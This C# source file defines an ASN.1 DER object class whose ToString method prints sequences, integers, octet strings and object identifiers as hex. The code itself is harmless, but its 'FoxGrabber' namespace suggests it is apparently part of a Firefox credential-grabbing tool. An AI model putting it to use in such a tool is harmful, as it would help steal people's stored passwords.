namespace FoxGrabber.Cryptography
{
    using System.Collections.Generic;
    using System.Text;

    public class Asn1DerObject : IAsn1DerObject
    {
        public Asn1Der.Type Type { get; set; }
        public int Lenght { get; set; }
        public List<Asn1DerObject> objects { get; set; }
        public byte[] Data { get; set; }

        public Asn1DerObject() => this.objects = new List<Asn1DerObject>();

        public override string ToString()
        {
            var str = new StringBuilder();
            var data = new StringBuilder();
            switch (this.Type)
            {
                case Asn1Der.Type.Sequence:
                    str.AppendLine("SEQUENCE {");
                    break;
                case Asn1Der.Type.Integer:
                    foreach (byte octet in this.Data)
                    {
                        data.AppendFormat("{0:X2}", octet);
                    }
                    str.AppendLine($"\tINTEGER {data}");
                    data.Clear();
                    break;
                case Asn1Der.Type.OctetString:

                    foreach (byte octet in this.Data)
                    {
                        data.AppendFormat("{0:X2}", octet);
                    }
                    str.AppendLine($"\tOCTETSTRING {data.ToString()}");
                    data.Clear();
                    break;
                case Asn1Der.Type.ObjectIdentifier:
                    foreach (byte octet in this.Data)
                    {
                        data.AppendFormat("{0:X2}", octet);
                    }
                    str.AppendLine($"\tOBJECTIDENTIFIER {data.ToString()}");
                    data.Clear();
                    break;
                case Asn1Der.Type.BitString:
                    break;
                case Asn1Der.Type.Null:
                    break;
                default:
                    break;
            }
            foreach (Asn1DerObject obj in this.objects)
            {
                str.Append(obj.ToString());
            }

            if (this.Type.Equals(Asn1Der.Type.Sequence))
            {
                str.AppendLine("}");
            }
            return str.ToString();
        }
    }
}